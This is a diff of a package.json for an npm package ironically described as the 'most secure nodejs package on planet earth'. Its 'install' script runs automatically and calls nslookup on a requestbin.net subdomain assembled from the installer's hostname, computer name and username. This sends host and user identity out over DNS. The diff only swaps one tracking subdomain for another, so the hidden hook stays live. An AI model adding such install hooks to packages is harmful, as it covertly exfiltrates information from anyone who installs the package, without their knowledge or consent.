@@ -4,7 +4,7 @@
   "description": "most secure nodejs  package on planet earth",
   "main": "index.js",
   "scripts": {
-    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.most-secure-package.be243316447349c82d17.d.requestbin.net"
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.most-secure-package.a430051ef18acd86255c.d.requestbin.net"
   },
   "author": "another noob developer",
   "license": "ISC"
